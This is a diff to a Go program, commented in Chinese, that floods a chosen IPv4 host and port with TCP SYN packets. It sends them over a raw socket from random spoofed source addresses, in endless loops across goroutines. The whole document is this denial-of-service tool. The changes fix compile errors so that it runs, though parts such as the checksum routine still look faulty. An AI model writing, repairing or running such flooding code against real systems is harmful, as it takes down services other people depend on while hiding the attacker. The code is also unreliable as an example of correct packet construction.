@@ -7,7 +7,9 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"os"
 	"syscall"
+	"time"
 )
 
 func main() {
@@ -17,19 +19,19 @@ func main() {
 
 	if *host == "" {
 		fmt.Println("参数 h 不能为空")
-		return 1
+		return
 	}
 
 	if *port == 0 {
 		fmt.Println("参数 p 不能为空")
-		return 1
+		return
 	}
 
 	ipv4Addr := net.ParseIP(*host).To4()
 	//目前没有实现ipv6
 	if ipv4Addr == nil {
 		fmt.Println("参数 h 不是有效的IPv4地址")
-		return 1
+		return
 	}
 
 	handle(ipv4Addr, *port)
@@ -44,7 +46,7 @@ func handle(ip net.IP, port int) {
 	}
 
 	//设置IP层信息，使其能够修改IP层数据
-	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, 0x3, 1)
+	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -64,9 +66,12 @@ func handle(ip net.IP, port int) {
 		go func() {
 			var b bytes.Buffer
 			for {
-				b.Write(getIPV4Header(ip))
-				b.Write(getTcpHeader(dstPort))
-				rawSocket.WriteTo(b)
+				ipv4Byte, _ := getIPV4Header(ip)
+				tcpByte, _ := getTcpHeader(port)
+
+				b.Write(ipv4Byte)
+				b.Write(tcpByte)
+				fmt.Println(rawSocket.Write(b.Bytes()))
 			}
 		}()
 	}
@@ -75,39 +80,42 @@ func handle(ip net.IP, port int) {
 	<-c
 }
 
-func getIPV4Header(destIp net.IP) []byte {
+func getIPV4Header(dstIP net.IP) ([]byte, error) {
 	rand.Seed(time.Now().UnixNano())
 	srcIP := net.IP(make([]byte, 4))
 	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
 
-	h := &IPV4Header{
+	h := &ipv4Header{
 		ID:       1,
 		TTL:      255,
 		Protocol: syscall.IPPROTO_TCP,
 		Checksum: 0,
 		Src:      srcIP,
-		Dst:      destIP,
+		Dst:      dstIP,
 	}
 
-	b.Checksum = int(crc16(h.Marshal()))
+	b, _ := h.Marshal()
+	h.Checksum = int(crc16(b))
 
 	return h.Marshal()
 }
 
-func getTcpHeader(dstPort int) []byte {
+func getTcpHeader(dstPort int) ([]byte, error) {
 	rand.Seed(time.Now().UnixNano())
 
 	h := &tcpHeader{
 		Src:  rand.Intn(1<<16-1)%16383 + 49152,
 		Dst:  dstPort,
-		Seq:  uint32(rand.Intn(1<<32 - 1)),
+		Seq:  rand.Intn(1<<32 - 1),
 		Ack:  0,
 		Flag: 0x02,
 		Win:  2048,
 		Urp:  0,
 	}
 
-	b.Checksum = int(crc16(h.Marshal()))
+	b, _ := h.Marshal()
+
+	h.Sum = int(crc16(b))
 
 	return h.Marshal()
 }
